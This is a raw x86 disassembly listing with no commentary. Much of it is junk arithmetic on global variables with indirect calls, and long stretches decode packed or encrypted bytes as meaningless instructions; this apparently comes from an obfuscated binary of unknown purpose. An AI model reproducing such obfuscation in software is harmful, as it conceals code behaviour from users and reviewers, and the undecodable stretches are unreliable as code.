  402334:	mov    DWORD PTR ds:0x4281a1,edx
  40233a:	mov    DWORD PTR ds:0x428195,0x4f52
  402344:	jmp    0x402410
  402349:	mov    edx,DWORD PTR ds:0x428215
  40234f:	cmp    DWORD PTR ds:0x428195,0x0
  402356:	jl     0x402387
  40235c:	push   DWORD PTR [ebp-0x20]
  40235f:	call   DWORD PTR ds:0x428a5c
  402365:	mov    edx,DWORD PTR ds:0x428225
  40236b:	sbb    DWORD PTR ds:0x4282b9,edx
  402371:	xor    DWORD PTR ds:0x428201,0x1c21
  40237b:	adc    DWORD PTR ds:0x42822d,ebx
  402381:	sbb    edx,DWORD PTR ds:0x428221
  402387:	or     edx,DWORD PTR ds:0x428219
  40238d:	sbb    DWORD PTR ds:0x4282bd,edx
  402393:	add    DWORD PTR ds:0x4282b5,edi
  402399:	cmp    DWORD PTR ds:0x428201,0x0
  4023a0:	mov    DWORD PTR ds:0x4282b5,0x29fb
  4023aa:	mov    edx,0x2f4f
  4023af:	mov    edx,0x203e
  4023b4:	jmp    0x402410
  4023b9:	mov    DWORD PTR ds:0x428289,0x380e
  4023c3:	cmp    DWORD PTR ds:0x428201,0x0
  4023ca:	je     0x4023fa
  4023d0:	push   DWORD PTR [ebp-0x10]
  4023d3:	push   0x42803d
  4023d8:	call   DWORD PTR ds:0x428a60
  4023de:	xor    edx,0x522a
  4023e4:	add    edx,DWORD PTR ds:0x42822d
  4023ea:	adc    DWORD PTR ds:0x4282c9,0x5193
  4023f4:	or     edx,0x5e6f
  4023fa:	adc    DWORD PTR ds:0x428235,ecx
  402400:	sub    DWORD PTR ds:0x42826d,0x19b3
  40240a:	and    edx,0x31cc
  402410:	xor    eax,ecx
  402412:	mov    ecx,DWORD PTR [ebp-0x70]
  402415:	mov    edx,DWORD PTR [ebp-0x6c]
  402418:	sub    eax,ecx
  40241a:	mov    ecx,DWORD PTR ds:0x428261
  402420:	mov    edx,DWORD PTR ds:0x4282d5
  402426:	sub    edx,ecx
  402428:	and    ecx,DWORD PTR [ecx+edx*1]
  40242b:	mov    ecx,DWORD PTR ds:0x4222d8
  402431:	lea    eax,[eax+ecx*1-0x27d2]
  402438:	xor    edx,edx
  40243a:	or     edx,DWORD PTR ds:0x42825d
  402440:	mov    edx,DWORD PTR [edx]
  402442:	sbb    DWORD PTR ds:0x428289,edx
  402448:	mov    ecx,DWORD PTR [ebp-0x1c]
  40244b:	mov    edx,DWORD PTR ds:0x42829d
  402451:	mov    edx,DWORD PTR [edx]
  402453:	sub    DWORD PTR ds:0x4281a5,edx
  402459:	mov    edx,DWORD PTR [ebp-0x2c]
  40245c:	adc    DWORD PTR ds:0x428241,0x428219
  402466:	or     ecx,0x4f00
  40246c:	and    ecx,edx
  40246e:	mov    DWORD PTR ds:0x428271,0x64db
  402478:	mov    edx,DWORD PTR [ebp-0x34]
  40247b:	add    DWORD PTR ds:0x42826d,0x5537
  402485:	or     ecx,edx
  402487:	xor    DWORD PTR ds:0x4282b1,0x5522
  402491:	xor    ecx,0x5fdd
  402497:	cmp    ecx,DWORD PTR [eax]
  402499:	mov    DWORD PTR ds:0x428281,0x7b78
  4024a3:	jne    0x4069dd
  4024a9:	mov    ecx,DWORD PTR ds:0x428275
  4024af:	adc    DWORD PTR ds:0x428225,ecx
  4024b5:	mov    ecx,DWORD PTR [esi]
  4024b7:	mov    eax,ds:0x4281f5
  4024bc:	mov    edx,DWORD PTR ds:0x4282a9
  4024c2:	sub    eax,edx
  4024c4:	imul   eax,DWORD PTR [eax+edx*1]
  4024c8:	jmp    0x402772
  4024cd:	add    DWORD PTR [ecx+0x7cb36e93],esp
  4024d3:	sub    eax,0x2776d1b5
  4024d8:	inc    ebp
  4024d9:	(bad)  
  4024da:	(bad)  
  4024db:	mov    ebp,0xbbcf022f
  4024e0:	mov    ebx,0xbbbbbfd0
  4024e5:	sti    
  4024e6:	fild   QWORD PTR [edi+0x363be58]
  4024ec:	mov    al,0xd0
  4024ee:	fwait
  4024ef:	or     esi,DWORD PTR [edi]
  4024f1:	rol    DWORD PTR [edx],1
  4024f3:	(bad)  
  4024f4:	jg     0x402534
  4024f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024f7:	(bad)  
  4024f8:	add    ch,BYTE PTR [ebp-0x4a]
  4024fb:	retf   
  4024fc:	clc    
  4024fd:	mov    eax,ds:0x8de2048c
  402502:	dec    eax
  402503:	xchg   ecx,eax
  402504:	clc    
  402505:	xchg   BYTE PTR [ebp-0x73],dh
  402508:	inc    edi
  402509:	add    bl,BYTE PTR [edi]
  40250b:	cmc    
  40250c:	(bad)  
  40250d:	ins    BYTE PTR es:[edi],dx
  40250e:	fwait
  40250f:	rcr    BYTE PTR [esi+esi*4-0x14],cl
  402513:	xchg   bh,bh
  402515:	call   0x79384e19
  40251a:	adc    BYTE PTR [ebp-0x51],ah
  40251d:	push   ds
  40251e:	mov    cl,0x4e
  402520:	(bad)  
  402521:	xor    al,0x72
  402523:	jne    0x402581
  402525:	leave  
  402526:	sub    BYTE PTR [edi+0x3f638539],ch
  40252c:	(bad)
  40252f:	jmp    0x4024d9
  402531:	daa    
  402532:	jg     0x4025a4
  402534:	xor    eax,0xfbf590ac
  402539:	add    bl,al
  40253b:	cs aaa 
  40253d:	sub    ecx,DWORD PTR [ebx+0x734b364a]
  402543:	pop    edi
  402544:	dec    ecx
  402545:	les    ecx,FWORD PTR [edx]
  402547:	jnp    0x4024e9
  402549:	cmp    ebp,ecx
  40254b:	jmp    0x12a7b96f
  402550:	jecxz  0x40256a
  402552:	jne    0x402552
  402554:	pop    ecx
  402555:	dec    edi
  402556:	mov    ebx,0xd5fda73b
  40255b:	mov    edi,0x26aab72f
  402560:	retf   0xca34
  402563:	inc    edx
  402564:	add    eax,0x59add7d5
  402569:	xor    DWORD PTR [ecx+0x6fea822f],0xffffffe1
  402570:	gs or  eax,0x8a7ea4ce
  402576:	or     al,0x10
  402578:	mov    ds:0x4bb762ac,eax
  40257d:	enter  0xba27,0x6b
  402581:	push   0x582fb4a9
  402586:	popf   
  402587:	xchg   esp,eax
  402588:	in     al,0x32
  40258a:	mov    ecx,0x3caf4e32
  40258f:	mov    ebp,?
  402591:	push   ss
  402592:	sti    
  402593:	mov    ch,0x2b
  402595:	pop    ss
  402596:	out    0xa9,eax
  402598:	xchg   DWORD PTR [esi-0x32],ebp
  40259b:	push   ds
  40259c:	mov    ebp,0xe5a81dba
  4025a1:	stc    
  4025a2:	jmp    FWORD PTR [ecx+0x78cf2214]
  4025a8:	jp     0x402603
  4025aa:	jmp    0x5ed6f1d7
  4025af:	ret    
  4025b0:	stos   BYTE PTR es:[edi],al
  4025b1:	add    eax,edx
  4025b3:	sub    bh,BYTE PTR [esi-0x13]
  4025b6:	and    cl,BYTE PTR [ebp-0x4b]
  4025b9:	sub    DWORD PTR [ebp+eax*2-0x7f45505c],ecx
  4025c0:	xor    ebx,DWORD PTR [edi]
  4025c2:	test   al,0x51
  4025c4:	sub    BYTE PTR [edi-0x4c],cl
  4025c7:	sbb    eax,0x79fa021c
  4025cd:	jne    0x4025b1
  4025cf:	fs into 
  4025d1:	int3   
  4025d2:	in     eax,dx
  4025d3:	int3   
  4025d4:	in     eax,dx
  4025d5:	mov    WORD PTR [ebp-0xc],es
  4025d8:	or     al,0x8
  4025da:	or     DWORD PTR [eax],edx
  4025dc:	adc    ebx,DWORD PTR [ecx-0x18]
  4025df:	dec    ebp
  4025e0:	aas    
  4025e1:	cli    
  4025e2:	std    
  4025e3:	sahf   
  4025e4:	xchg   edx,eax
  4025e5:	or     cl,BYTE PTR [ebp+ecx*1+0x68e5d55]
  4025ec:	mov    edx,0x87de05da
  4025f1:	aas    
  4025f2:	and    DWORD PTR [esi+0x1d6eed8b],eax
  4025f8:	lods   al,BYTE PTR ds:[esi]
  4025f9:	mov    BYTE PTR [ebx+0x7cb1bc9a],dl
  4025ff:	aas    
  402600:	sahf   
  402601:	push   es
  402602:	stos   BYTE PTR es:[edi],al
  402603:	mov    edx,DWORD PTR [edx]
  402605:	aaa    
  402606:	pop    ecx
  402607:	push   edx
  402608:	add    edi,DWORD PTR [esi+ebp*1+0x15d6921b]
  40260f:	cmp    esp,esp
  402611:	shr    DWORD PTR [eax],1
  402613:	in     eax,0xe1
  402615:	popf   
  402616:	mov    ds:0x6206184d,eax
  40261b:	dec    edx
  40261c:	rcl    DWORD PTR [ecx],1
  40261e:	aas    
  40261f:	repnz sub al,0xa0
  402622:	rcl    BYTE PTR [ebp+0x51],cl
  402625:	stos   BYTE PTR es:[edi],al
  402626:	sub    bh,BYTE PTR [ebx+0x75]
  402629:	mov    eax,ds:0xa11b0ef6
  40262e:	sub    DWORD PTR [esi+0x16],ebx
  402631:	push   ecx
  402632:	mov    edx,0x97f06c80
  402637:	fimul  WORD PTR [ecx-0x421e428e]
  40263d:	in     al,0xc0
  40263f:	dec    ebp
  402640:	(bad)  
  402641:	stos   BYTE PTR es:[edi],al
  402642:	or     edx,edi
  402644:	jge    0x402646
  402646:	push   esi
  402647:	iret   
  402648:	xchg   ebx,eax
  402649:	mov    bl,0xa8
  40264b:	or     ah,bh
  40264d:	(bad)  
  40264f:	or     edi,esp
  402651:	sub    ebx,DWORD PTR [edi]
  402653:	cmp    al,0xd8
  402655:	xor    eax,0x8eba0e11
  40265a:	(bad)  [edi-0x7e]
  40265d:	sar    BYTE PTR [esi],0x99
  402660:	xchg   esi,eax
  402661:	iret   
  402662:	or     al,BYTE PTR [ebx-0x54]
  402665:	pop    esi
  402666:	mov    cl,0xfc
  402668:	mov    ebp,DWORD PTR [esp+edi*4]
  40266b:	add    eax,DWORD PTR [edx+eax*8-0x7ba2a9be]
  402672:	icebp  
  402673:	sub    ebx,ebx
  402675:	out    dx,al
  402676:	test   DWORD PTR [edi+0x15],esp
  402679:	jno    0x40260b
  40267b:	and    dl,al
  40267d:	pop    ss
  40267e:	into   
  40267f:	push   0xc
  402681:	jns    0x4026b3
  402683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402684:	fcom   QWORD PTR [edx+0x1c]
  402687:	shl    BYTE PTR [eax],cl
  402689:	mov    bl,0xe3
  40268b:	fld    DWORD PTR [eax-0x194aeee]
  402691:	aad    0x6c
  402693:	xor    dl,0x65
  402696:	fmul   st(0),st
  402698:	hlt    
  402699:	popa   
  40269a:	push   ebp
  40269b:	rcr    DWORD PTR [ecx-0x2b005f7a],1
  4026a1:	jo     0x40266b
  4026a3:	iret   
  4026a4:	xchg   ebp,eax
  4026a5:	pop    ds
  4026a6:	fidiv  DWORD PTR fs:[ebx+0x66]
  4026aa:	sahf   
  4026ab:	call   0x9b12bf64
  4026b0:	jne    0x402727
  4026b2:	mov    bh,0x1f
  4026b4:	das    
  4026b5:	mov    bl,cl
  4026b7:	stos   BYTE PTR es:[edi],al
  4026b8:	jmp    0x402669
  4026ba:	(bad)  
  4026bb:	mov    dl,0x50
  4026bd:	add    BYTE PTR [edi],bh
  4026bf:	cmp    eax,0xd26e6214
  4026c4:	mov    ch,0x60
  4026c6:	add    DWORD PTR [ecx],edx
  4026c8:	ds push eax
  4026ca:	sbb    edi,esp
  4026cc:	xchg   esi,eax
  4026cd:	sbb    al,BYTE PTR [ebp+0xe7e1b12]
  4026d3:	aas    
  4026d4:	push   es
  4026d5:	and    al,bh
  4026d7:	cdq    
  4026d8:	scas   al,BYTE PTR es:[edi]
  4026d9:	jns    0x40270b
  4026db:	ins    DWORD PTR es:[edi],dx
  4026dc:	ins    DWORD PTR es:[edi],dx
  4026dd:	cdq    
  4026de:	sbb    dh,BYTE PTR [edi+ebx*8+0x1a]
  4026e2:	hlt    
  4026e3:	xlat   BYTE PTR ds:[ebx]
  4026e4:	and    eax,0xeedc5505
  4026e9:	mov    ecx,DWORD PTR es:[ebp-0x2da0867e]
  4026f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026f1:	mov    esi,0xc08656ea
  4026f6:	lods   al,BYTE PTR ds:[esi]
  4026f7:	leave  
  4026f8:	mov    esi,0xbf8521ae
  4026fd:	bound  ebx,QWORD PTR ds:[ebp+0x3b1f6fcf]
  402704:	ins    BYTE PTR es:[edi],dx
  402705:	push   ecx
  402706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402707:	pop    edi
  402708:	fs call 0xc004:0x41c3f5b4
  402710:	cmc    
  402711:	fmul   QWORD PTR fs:[esp+ebp*8]
  402715:	fs jns 0x402764
  402718:	jp     0x4026c8
  40271a:	pop    ebx
  40271b:	jno    0x402764
  40271d:	jmp    0x4026b0
  40271f:	fst    DWORD PTR ds:0x7e3023da
  402725:	das    
  402726:	cwde   
  402727:	mov    edi,edi
  402729:	arpl   WORD PTR [esi],cx
  40272b:	push   ebp
  40272c:	scas   eax,DWORD PTR es:[edi]
  40272d:	pop    ecx
  40272e:	mov    ds,edx
  402730:	mov    edi,0x1a01f238
  402735:	or     BYTE PTR [esi+0x27],bl
  402738:	repnz clc 
  40273a:	es stos BYTE PTR es:[edi],al
  40273c:	setno  al
  40273f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402740:	clc    
  402741:	imul   edx,ecx,0xffffffe4
  402744:	ret    0x6300
  402747:	cmp    BYTE PTR [eax-0x32fa6247],bh
  40274d:	xor    al,0xd7
  40274f:	push   0xff266552
  402754:	xchg   ebp,eax
  402755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402756:	popf   
  402757:	mov    al,0x39
  402759:	(bad)  
  40275a:	xchg   ebx,eax
  40275b:	inc    ebx
  40275c:	push   0xb6fb8ab
  402761:	gs pop esi
  402763:	xchg   ebx,eax
  402764:	or     dl,BYTE PTR [ecx+0x3]
  402767:	ja     0x4027c5
  402769:	fsub   QWORD PTR [eax]
  40276b:	leave  
  40276c:	pop    edi
  40276d:	mov    ds:0x63c30bd3,al
  402772:	mov    eax,DWORD PTR [esi+0x4]
  402775:	shrd   ecx,eax,0x2
  402779:	add    DWORD PTR ds:0x4281a5,0x3b8f
  402783:	shr    eax,0x2
  402786:	and    DWORD PTR ds:0x4282d1,0x5860
  402790:	mov    eax,DWORD PTR [esi]
  402792:	and    DWORD PTR ds:0x428239,0x3018
  40279c:	mov    edx,DWORD PTR [esi+0x4]
  40279f:	sub    DWORD PTR ds:0x4281fd,0x42822d
  4027a9:	shl    eax,0x1e
  4027ac:	xor    ecx,edi
  4027ae:	xor    eax,eax
  4027b0:	or     eax,ecx
  4027b2:	mov    DWORD PTR ds:0x4281ad,0x4548
  4027bc:	mov    ecx,DWORD PTR [ebp-0x14]
  4027bf:	mov    DWORD PTR ds:0x4282b9,0x7355
  4027c9:	cmp    eax,DWORD PTR [ecx]
  4027cb:	jne    0x40298e
  4027d1:	cmp    DWORD PTR ds:0x4281fd,0x0
  4027d8:	mov    edx,DWORD PTR ds:0x4282b9
  4027de:	mov    DWORD PTR ds:0x428229,edx
  4027e4:	mov    ecx,0xa43
  4027e9:	mov    ecx,DWORD PTR ds:0x428281
  4027ef:	jmp    0x402845
  4027f4:	mov    DWORD PTR ds:0x4282b5,0x76
  4027fe:	movzx  eax,BYTE PTR ds:0x428239
  402805:	cmp    DWORD PTR ds:0x4281fd,0x0
  40280c:	jl     0x402831
  402812:	push   0x427fd4
  402817:	call   DWORD PTR ds:0x428aa4
  40281d:	sub    edx,0x665a
  402823:	not    DWORD PTR ds:0x428275
  402829:	sbb    edx,DWORD PTR ds:0x4281a5
  40282f:	sbb    ecx,edx
  402831:	or     DWORD PTR ds:0x4281a9,0x310
  40283b:	and    DWORD PTR ds:0x428199,0x10cf
  402845:	mov    eax,DWORD PTR [ebp-0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0x20]
  40284b:	xor    DWORD PTR [eax],ecx
  40284d:	mov    eax,DWORD PTR [ebp-0xc]
  402850:	cmp    DWORD PTR ds:0x42826d,0x0
  402857:	mov    DWORD PTR ds:0x428219,edi
  40285d:	mov    edx,0x1b54
  402862:	jmp    0x4028ad
  402867:	mov    DWORD PTR ds:0x428221,edx
  40286d:	cmp    DWORD PTR ds:0x42826d,0x0
  402874:	jbe    0x402897
  40287a:	push   0x81cd
  40287f:	call   DWORD PTR ds:0x428a64
  402885:	mov    edx,DWORD PTR ds:0x428269
  40288b:	add    DWORD PTR ds:0x428225,edx
  402891:	or     ecx,0x8f1
  402897:	add    DWORD PTR ds:0x4282c5,edx
  40289d:	or     DWORD PTR ds:0x428235,ecx
  4028a3:	sub    DWORD PTR ds:0x4282b9,0x67a2
  4028ad:	mov    ecx,DWORD PTR [ebp+0x18]
  4028b0:	adc    edx,0x23b7
  4028b6:	mov    edx,DWORD PTR [ebp+0x1c]
  4028b9:	add    DWORD PTR ds:0x428215,0x428281
  4028c3:	shrd   ecx,edx,0x2
  4028c7:	and    DWORD PTR ds:0x4281a1,0x4921
  4028d1:	mov    DWORD PTR [ebp-0x14],ecx
  4028d4:	cmp    DWORD PTR ds:0x42823d,0x0
  4028db:	mov    DWORD PTR ds:0x4281ad,edx
  4028e1:	mov    DWORD PTR ds:0x428211,0x7a7f
  4028eb:	jmp    0x40294b
  4028f0:	mov    DWORD PTR ds:0x428191,0x331f
  4028fa:	cmp    DWORD PTR ds:0x42823d,0x0
  402901:	jg     0x402936
  402907:	push   0x1e77
  40290c:	push   DWORD PTR [ebp-0x10]
  40290f:	push   0x428001
  402914:	call   DWORD PTR ds:0x428a68
  40291a:	adc    DWORD PTR ds:0x428199,ecx
  402920:	sbb    DWORD PTR ds:0x428281,0x2908
  40292a:	sub    DWORD PTR ds:0x4281ad,ebx
  402930:	sub    DWORD PTR ds:0x4282cd,ebx
  402936:	not    ecx
  402938:	and    DWORD PTR ds:0x428209,ebx
  40293e:	mov    ecx,DWORD PTR ds:0x4282bd
  402944:	add    DWORD PTR ds:0x428239,ecx
  40294a:	dec    ecx
  40294b:	mov    ecx,DWORD PTR [ebp+0x18]
  40294e:	xor    DWORD PTR [ebp-0x14],edi
  402951:	sbb    DWORD PTR ds:0x4281a1,0x3b47
  40295b:	shr    edx,0x2
  40295e:	xor    edx,DWORD PTR ds:0x428195
  402964:	mov    edx,DWORD PTR [ebp+0x1c]
  402967:	mov    DWORD PTR ds:0x4282c1,0x46b0
  402971:	xor    edx,edx
  402973:	or     edx,DWORD PTR [ebp-0x14]
  402976:	shl    ecx,0x1e
  402979:	movzx  ecx,WORD PTR ds:0x42822d
  402980:	xor    ecx,DWORD PTR ds:0x428205
  402986:	mov    DWORD PTR ds:0x42822d,ecx
  40298c:	sub    DWORD PTR [eax],edx
  40298e:	mov    eax,ds:0x4282c9
  402993:	xor    DWORD PTR ds:0x4281a1,eax
  402999:	mov    eax,ds:0x422120
  40299e:	adc    DWORD PTR ds:0x4282b5,edi
  4029a4:	mov    ecx,DWORD PTR [ebp-0xc]
  4029a7:	add    DWORD PTR ds:0x428219,edx
  4029ad:	mov    eax,DWORD PTR [eax]
  4029af:	add    eax,DWORD PTR [ecx]
  4029b1:	mov    DWORD PTR [ebp-0x14],eax
  4029b4:	add    ecx,DWORD PTR ds:0x42821d
  4029ba:	mov    ecx,DWORD PTR [ebx]
  4029bc:	or     eax,eax
  4029be:	mov    eax,DWORD PTR [ebx+0x4]
  4029c1:	neg    edx
  4029c3:	shrd   ecx,eax,0x2
  4029c7:	shr    eax,0x2
  4029ca:	xor    edx,edx
  4029cc:	or     edx,DWORD PTR ds:0x4282e5
  4029d2:	mov    edx,DWORD PTR [edx]
  4029d4:	add    DWORD PTR ds:0x428221,edx
  4029da:	mov    eax,DWORD PTR [ebx]
  4029dc:	and    DWORD PTR ds:0x4282c9,0x42822d
  4029e6:	mov    edx,DWORD PTR [ebx+0x4]
  4029e9:	add    edx,DWORD PTR ds:0x428239
  4029ef:	xor    ecx,edi
  4029f1:	shl    eax,0x1e
  4029f4:	xor    eax,eax
  4029f6:	adc    DWORD PTR ds:0x428241,0x3723
  402a00:	or     eax,ecx
  402a02:	mov    ecx,DWORD PTR [ebx]
  402a04:	mov    edx,DWORD PTR [ebx+0x4]
  402a07:	add    DWORD PTR ds:0x42827d,0x42826d
  402a11:	shrd   ecx,edx,0x2
  402a15:	shr    edx,0x2
  402a18:	movzx  edx,WORD PTR ds:0x4282cd
  402a1f:	sub    edx,DWORD PTR ds:0x4282d1
  402a25:	mov    DWORD PTR ds:0x4282cd,edx
  402a2b:	mov    DWORD PTR [ebp-0x1c],ecx
  402a2e:	sbb    DWORD PTR ds:0x4281b1,edx
  402a34:	mov    ecx,DWORD PTR [ebx]
  402a36:	or     DWORD PTR ds:0x4282b5,0x45de
  402a40:	mov    edx,DWORD PTR [ebx+0x4]
  402a43:	xor    DWORD PTR ds:0x428275,0x185d
  402a4d:	xor    DWORD PTR [ebp-0x1c],edi
  402a50:	xor    edx,edx
  402a52:	sbb    DWORD PTR ds:0x42826d,0x3955
  402a5c:	or     edx,DWORD PTR [ebp-0x1c]
  402a5f:	not    DWORD PTR ds:0x4282b1
  402a65:	shl    ecx,0x1e
  402a68:	sub    DWORD PTR ds:0x428269,0x6070
  402a72:	lea    ecx,[edx+eax*1]
  402a75:	and    eax,edx
  402a77:	mov    eax,DWORD PTR [ebx]
  402a79:	not    DWORD PTR ds:0x428241
  402a7f:	mov    edx,DWORD PTR [ebx+0x4]
  402a82:	mov    DWORD PTR ds:0x42827d,0xafa
  402a8c:	shrd   eax,edx,0x2
  402a90:	shr    edx,0x2
  402a93:	mov    DWORD PTR [ebp-0x1c],eax
  402a96:	xor    edx,0x7ef2
  402a9c:	mov    eax,DWORD PTR [ebx]
  402a9e:	cmp    DWORD PTR ds:0x42819d,0x0
  402aa5:	mov    DWORD PTR ds:0x428225,0x379f
  402aaf:	mov    edx,DWORD PTR ds:0x428225
  402ab5:	jmp    0x402b26
  402aba:	mov    DWORD PTR ds:0x428219,0x2fd6
  402ac4:	cmp    DWORD PTR ds:0x42819d,0x0
  402acb:	jge    0x402b01
  402ad1:	push   DWORD PTR [ebp-0x18]
  402ad4:	push   0x428215
  402ad9:	push   0x7bb8
  402ade:	push   0x2538
  402ae3:	call   DWORD PTR ds:0x428a6c
  402ae9:	sub    DWORD PTR ds:0x428215,edi
  402aef:	add    DWORD PTR ds:0x428235,edx
  402af5:	xor    edx,DWORD PTR ds:0x4282b1
  402afb:	sub    DWORD PTR ds:0x428211,ebx
  402b01:	sub    edx,DWORD PTR ds:0x4281a1
  402b07:	and    DWORD PTR ds:0x4282b5,ecx
  402b0d:	movzx  edx,BYTE PTR ds:0x428211
  402b14:	or     DWORD PTR ds:0x4281b1,edx
  402b1a:	sbb    DWORD PTR ds:0x4281a9,ecx
  402b20:	xor    edx,DWORD PTR ds:0x428269
  402b26:	mov    edx,DWORD PTR [ebx+0x4]
  402b29:	xor    DWORD PTR ds:0x4281b1,edx
  402b2f:	xor    DWORD PTR [ebp-0x1c],edi
  402b32:	mov    edx,eax
  402b34:	and    DWORD PTR ds:0x428271,0x428191
  402b3e:	xor    eax,eax
  402b40:	or     eax,DWORD PTR [ebp-0x1c]
  402b43:	add    DWORD PTR ds:0x4281a1,0x428281
  402b4d:	shl    edx,0x1e
  402b50:	sbb    DWORD PTR ds:0x428235,0x3e99
  402b5a:	imul   eax,ecx
  402b5d:	xor    DWORD PTR ds:0x428211,0x31bf
  402b67:	mov    ecx,DWORD PTR [ebx]
  402b69:	mov    edx,DWORD PTR [ebx+0x4]
  402b6c:	add    DWORD PTR ds:0x428289,0x4282bd
  402b76:	shrd   ecx,edx,0x2
  402b7a:	mov    DWORD PTR [ebp-0x1c],ecx
  402b7d:	xor    DWORD PTR ds:0x428289,edx
  402b83:	mov    ecx,DWORD PTR [ebx]
  402b85:	sub    DWORD PTR ds:0x4282c1,0x428241
  402b8f:	xor    DWORD PTR [ebp-0x1c],edi
  402b92:	shr    edx,0x2
  402b95:	sbb    DWORD PTR ds:0x4282bd,edx
  402b9b:	mov    edx,DWORD PTR [ebx+0x4]
  402b9e:	movzx  edx,WORD PTR ds:0x428285
  402ba5:	or     DWORD PTR ds:0x428225,edx
  402bab:	mov    edx,ecx
  402bad:	xor    ecx,ecx
  402baf:	and    DWORD PTR ds:0x42819d,0xd75
  402bb9:	or     ecx,DWORD PTR [ebp-0x1c]
  402bbc:	or     DWORD PTR ds:0x4282cd,0x731e
  402bc6:	shl    edx,0x1e
  402bc9:	and    DWORD PTR ds:0x4282b1,0x6cdf
  402bd3:	sub    ecx,eax
  402bd5:	mov    DWORD PTR ds:0x4282c5,0x1dcf
  402bdf:	mov    eax,DWORD PTR [ebp-0xc]
  402be2:	mov    DWORD PTR ds:0x4282b1,edx
  402be8:	cmp    DWORD PTR [eax],ecx
  402bea:	jmp    0x402e94
  402bef:	sbb    DWORD PTR [eax],0xffffff9c
  402bf2:	xchg   esi,eax
  402bf3:	popf   
  402bf4:	xchg   esi,eax
  402bf5:	mov    DWORD PTR ds:0x311fa124,ebx
  402bfb:	jb     0x402c12
  402bfd:	or     DWORD PTR ds:0xbbbbd319,eax
  402c03:	sar    BYTE PTR [edi+0x2873bbbb],1
  402c09:	fimul  DWORD PTR [edx]
  402c0b:	(bad)  
  402c0c:	push   ebx
  402c0d:	out    dx,eax
  402c0e:	xchg   esp,eax
  402c0f:	retf   
  402c10:	push   ds
  402c11:	int    0x51
  402c13:	push   ds
  402c14:	and    bh,BYTE PTR [ecx+0x53]
  402c17:	clc    
  402c18:	das    
  402c19:	icebp  
  402c1a:	fsubp  st(7),st
  402c1c:	pop    es
  402c1d:	cmp    bh,BYTE PTR [ebx]
  402c1f:	mov    al,ds:0x89335209
  402c24:	xchg   esp,eax
  402c25:	pushf  
  402c26:	and    eax,0xc2418ed2
  402c2b:	sub    al,0x73
  402c2d:	and    DWORD PTR [edx],esi
  402c2f:	jle    0x402c0b
  402c31:	sub    eax,0x9dd6937
  402c36:	fiadd  WORD PTR [edi+0xb460510]
  402c3c:	sbb    ch,bh
  402c3e:	jmp    0x402be1
  402c40:	adc    BYTE PTR [ecx-0xf],ch
  402c43:	repnz fst DWORD PTR ds:0xf48c6ce2
  402c4a:	loope  0x402cc2
  402c4c:	dec    eax
  402c4d:	sahf   
  402c4e:	arpl   WORD PTR [eax+0x1],ax
  402c51:	mov    esi,0x3c8dd251
  402c56:	adc    al,0x27
  402c58:	inc    esp
  402c59:	jge    0x402c9c
  402c5b:	mov    cs,WORD PTR [ebx+0x57010070]
  402c61:	pop    ecx
  402c62:	mov    ds:0x12900357,al
  402c67:	jnp    0x402bf8
  402c69:	enter  0xbc5e,0x68
  402c6d:	inc    eax
  402c6e:	int    0xbe
  402c70:	or     dl,BYTE PTR ds:[eax+edi*1+0x76]
  402c75:	aam    0xc5
  402c77:	push   edx
  402c78:	out    dx,al
  402c79:	outs   dx,DWORD PTR ds:[esi]
  402c7a:	push   0xffffffe9
  402c7c:	fs ins DWORD PTR es:[edi],dx
  402c7e:	repz test al,0x32
  402c81:	retf   0x76cd
  402c84:	cmp    DWORD PTR [esp+eax*2+0x8d36e1c],esp
  402c8b:	mov    eax,esp
  402c8d:	mov    ebx,0x2ef5411b
  402c92:	pop    ecx
  402c93:	and    BYTE PTR [eax+edx*4+0x201b4696],al
  402c9a:	cmp    BYTE PTR [esi+0x173bec0f],ah
  402ca0:	push   ds
  402ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ca2:	jecxz  0x402c46
  402ca4:	mov    cl,0x1c
  402ca6:	dec    eax
  402ca7:	fistp  WORD PTR [edi]
  402ca9:	and    eax,0x959ec908
  402cae:	(bad)  
  402caf:	fisubr WORD PTR [esi-0x5f1616d6]
  402cb5:	push   ebx
  402cb6:	les    esi,FWORD PTR ds:0x6ae57c32
  402cbc:	add    al,BYTE PTR [eax-0x41]
  402cbf:	repnz mov edi,0x9b7ce04
  402cc5:	(bad)  
  402cc7:	outs   dx,DWORD PTR ds:[esi]
  402cc8:	mov    bl,0xde
  402cca:	xor    edi,eax
  402ccc:	xor    ecx,DWORD PTR [edx+0x3c]
  402ccf:	leave  
  402cd0:	shl    BYTE PTR [eax+0x321fdc42],1
  402cd6:	leave  
  402cd7:	xchg   BYTE PTR [ecx],dh
  402cd9:	(bad)
  402cdc:	not    ah
  402cde:	adc    bh,bl
  402ce0:	mov    bh,0x3e
  402ce2:	into   
  402ce3:	mov    bh,0x82
  402ce5:	pop    esp
  402ce6:	test   al,0x61
  402ce8:	sti    
  402ce9:	cwde   
  402cea:	push   ebx
  402ceb:	ja     0x402d28
  402ced:	rcr    BYTE PTR [ebx+0x2],cl
  402cf0:	push   ecx
  402cf1:	xchg   esp,eax
  402cf2:	cmp    DWORD PTR [eax-0x5bd15313],ebp
  402cf8:	lods   al,BYTE PTR ds:[esi]
  402cfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cfb:	(bad)  
  402cfc:	push   edi
  402cfd:	pop    esp
  402cfe:	fwait
  402cff:	push   ss
  402d00:	cld    
  402d01:	fnsave [ecx+ebp*4-0x75be56d0]
  402d08:	scas   al,BYTE PTR es:[edi]
  402d09:	mov    ah,0x87
  402d0b:	mov    ds:0xeb9093d4,eax
  402d10:	pop    ecx
  402d11:	jp     0x402d1e
  402d13:	(bad)  
  402d14:	pop    ebp
  402d15:	and    al,0x17
  402d17:	adc    edi,DWORD PTR [esi+0x1c]
  402d1a:	ins    BYTE PTR es:[edi],dx
  402d1b:	add    DWORD PTR [eax],esp
  402d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d1e:	loop   0x402cea
  402d20:	mov    bl,0x6c
  402d22:	(bad)  
  402d23:	xchg   esi,eax
  402d24:	(bad)  
  402d25:	in     al,dx
  402d26:	rcr    cl,1
  402d28:	cli    
